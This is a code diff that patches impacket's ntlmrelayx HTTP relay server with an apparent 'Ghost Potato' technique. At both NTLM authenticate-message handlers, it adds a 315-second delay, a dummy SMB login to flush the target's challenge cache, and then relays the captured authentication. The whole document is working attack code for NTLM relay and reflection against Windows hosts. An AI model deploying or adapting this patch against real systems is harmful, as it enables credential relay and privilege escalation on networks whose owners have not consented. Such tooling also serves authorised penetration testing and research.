@@ -31,7 +31,7 @@ from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
-
+from impacket.smbconnection import SMBConnection
 class HTTPRelayServer(Thread):
 
     class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
@@ -164,8 +164,25 @@ class HTTPRelayServer(Thread):
                     LOG.info("do negotiate failed, sending redirect")
                     self.do_REDIRECT()
             elif messageType == 3:
+                import time
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
+
+                d1 = 315
+                d2 = 5
+                print('[GPOTATO] WAITING %s SECONDS FOR CHALLENGE TIMEOUT' % (d1))
+                time.sleep(d1)
+                print('[GPOTATO] FLUSHING CHALLENGE CACHE NOW')
+                try:
+                    tempSmbConAddress = self.target.netloc.split(':')[0]
+                    tempSmbCon = SMBConnection(tempSmbConAddress, tempSmbConAddress)
+                    tempSmbCon.login('MADCOW', 'MADCOW', 'MADCOW')
+                    tempSmbCon.close()
+                except Exception as e:
+                    print('[GPOTATO] DONE: %s' % str(e))
+                print('[GPOTATO] WAITING ADDITIONAL %s SECONDS' % (d2))
+                time.sleep(d2)
+                print('[GPOTATO] AUTHENTICATING...')
 
                 if not self.do_ntlm_auth(token,authenticateMessage):
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
@@ -305,6 +322,23 @@ class HTTPRelayServer(Thread):
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
+
+                import time
+                d1 = 315
+                d2 = 5
+                print('[GPOTATO] WAITING %s SECONDS FOR CHALLENGE TIMEOUT' % (d1))
+                time.sleep(d1)
+                print('[GPOTATO] FLUSHING CHALLENGE CACHE NOW')
+                try:
+                    tempSmbConAddress = self.target.netloc.split(':')[0]
+                    tempSmbCon = SMBConnection(tempSmbConAddress, tempSmbConAddress)
+                    tempSmbCon.login('MADCOW', 'MADCOW', 'MADCOW')
+                    tempSmbCon.close()
+                except Exception as e:
+                    print('[GPOTATO] DONE: %s' % str(e))
+                print('[GPOTATO] WAITING ADDITIONAL %s SECONDS' % (d2))
+                time.sleep(d2)
+                print('[GPOTATO] AUTHENTICATING...')
 
                 if not self.do_ntlm_auth(token,authenticateMessage):
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
